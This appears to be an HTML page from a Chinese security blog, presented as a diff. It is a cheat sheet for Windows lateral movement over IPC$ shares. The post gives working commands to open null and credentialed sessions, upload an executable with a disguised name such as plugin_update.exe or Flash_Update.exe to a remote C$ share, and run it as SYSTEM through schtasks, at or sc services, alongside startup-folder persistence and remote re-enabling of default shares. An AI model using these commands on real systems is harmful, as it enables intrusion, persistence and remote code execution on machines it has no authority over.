@@ -1,0 +1,282 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>IPC渗透 | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="IPC渗透 | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="自启动目录
+#系统自启动
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+#用户自启动
+c:\users\用户名\appdata\roaming\Microsoft..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              IPC渗透
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-05-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="自启动目录">自启动目录</h3>
+<pre><code>#系统自启动
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+#用户自启动
+c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup
+</code></pre>
+<h3 id="查看本机连接共享情况">查看本机连接共享情况</h3>
+<pre><code>net use
+</code></pre>
+<h3 id="建立空连接">建立空连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;&quot; /u:&quot;&quot;
+</code></pre>
+<h3 id="建立正常连接">建立正常连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 
+</code></pre>
+<h3 id="查看已建立连接目标主机的共享资源">查看已建立连接目标主机的共享资源</h3>
+<pre><code>net view \\192.168.1.1
+</code></pre>
+<h3 id="查看目标主机时间">查看目标主机时间</h3>
+<pre><code>net time \\192.168.1.1
+</code></pre>
+<h3 id="删除本机与指定ip建立的连接">删除本机与指定ip建立的连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ /del /y
+</code></pre>
+<h3 id="删除本机所有已建立的连接">删除本机所有已建立的连接</h3>
+<pre><code>net use * /del /y
+</code></pre>
+<h3 id="文件的上传下载与删除">文件的上传下载与删除</h3>
+<pre><code>copy plugin_update.exe \\192.168.1.1\c$\windows\temp\plugin_update.exe
+[推荐用xcopy]:
+xcopy d:\sqlitedata\*.* \\192.168.1.1\c$\temp /E /Y /D
+（上传本地文件到目标的:c\windows\temp\目录下）
+copy \\192.168.1.1\c$\plugin_update.exe c:\
+（下载目标文件到本地c盘下）
+del \\192.168.1.1\c$\plugin_update.exe /F
+（删除目标文件）
+</code></pre>
+<h3 id="创建计划任务之schtasks">创建计划任务之schtasks</h3>
+<pre><code>schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+补充1：schtasks /create /tn &quot;Flash_Update&quot; /tr C:\Users\Public\Flash_Update.exe /sc minute /mo 1 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+立即执行计划任务
+schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+删除计划任务
+schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+计划任务远程开启默认共享{注意查看目标主机时间}
+schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+</code></pre>
+<h3 id="创建计划任务之at">创建计划任务之at</h3>
+<pre><code>（at只支持win03和部分老版本win08，一般情况下，win08-SP1的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）
+
+at \\192.168.1.1 14:05 cmd /c &quot;c:\windows\temp\test.bat&quot; 
+</code></pre>
+<h3 id="sc创建服务">SC创建服务</h3>
+<pre><code>（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报1053错误）
+sc \\192.168.1.1 create shellsrv binpath= &quot;c:\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 create test binpath= &quot;c:\windows\temp\test.bat&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 start shllsrv
+sc \\192.168.1.1 stop shllsrv
+sc \\192.168.1.1 delete shellsrv
+</code></pre>
+<h3 id="删除默认共享">删除默认共享</h3>
+<pre><code>net share c$ /del
+</code></pre>
+<h3 id="恢复默认共享">恢复默认共享</h3>
+<pre><code>net share c$=c:
+</code></pre>
+<h3 id="对方的c盘映射为自己的z盘其他盘类推不推荐">对方的c盘映射为自己的z盘，其他盘类推(不推荐)</h3>
+<pre><code>net use z: \\192.168.1.1\c$ &quot;1qaz@WSX&quot; /user:&quot;administrator&quot;
+</code></pre>
+<h3 id="删除映射的c盘其他盘类推">删除映射的c盘，其他盘类推</h3>
+<pre><code>net use c: /del
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95">自启动目录</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E6%83%85%E5%86%B5">查看本机连接共享情况</a></li>
+<li><a href="#%E5%BB%BA%E7%AB%8B%E7%A9%BA%E8%BF%9E%E6%8E%A5">建立空连接</a></li>
+<li><a href="#%E5%BB%BA%E7%AB%8B%E6%AD%A3%E5%B8%B8%E8%BF%9E%E6%8E%A5">建立正常连接</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90">查看已建立连接目标主机的共享资源</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%97%B6%E9%97%B4">查看目标主机时间</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E6%9C%AC%E6%9C%BA%E4%B8%8E%E6%8C%87%E5%AE%9Aip%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9E%E6%8E%A5">删除本机与指定ip建立的连接</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E6%9C%AC%E6%9C%BA%E6%89%80%E6%9C%89%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9E%E6%8E%A5">删除本机所有已建立的连接</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%88%A0%E9%99%A4">文件的上传下载与删除</a></li>
+<li><a href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B9%8Bschtasks">创建计划任务之schtasks</a></li>
+<li><a href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B9%8Bat">创建计划任务之at</a></li>
+<li><a href="#sc%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1">SC创建服务</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E9%BB%98%E8%AE%A4%E5%85%B1%E4%BA%AB">删除默认共享</a></li>
+<li><a href="#%E6%81%A2%E5%A4%8D%E9%BB%98%E8%AE%A4%E5%85%B1%E4%BA%AB">恢复默认共享</a></li>
+<li><a href="#%E5%AF%B9%E6%96%B9%E7%9A%84c%E7%9B%98%E6%98%A0%E5%B0%84%E4%B8%BA%E8%87%AA%E5%B7%B1%E7%9A%84z%E7%9B%98%E5%85%B6%E4%BB%96%E7%9B%98%E7%B1%BB%E6%8E%A8%E4%B8%8D%E6%8E%A8%E8%8D%90">对方的c盘映射为自己的z盘，其他盘类推(不推荐)</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E6%98%A0%E5%B0%84%E7%9A%84c%E7%9B%98%E5%85%B6%E4%BB%96%E7%9B%98%E7%B1%BB%E6%8E%A8">删除映射的c盘，其他盘类推</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/crackmapexec/">
+              <h3 class="post-title">
+                Crackmapexec
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
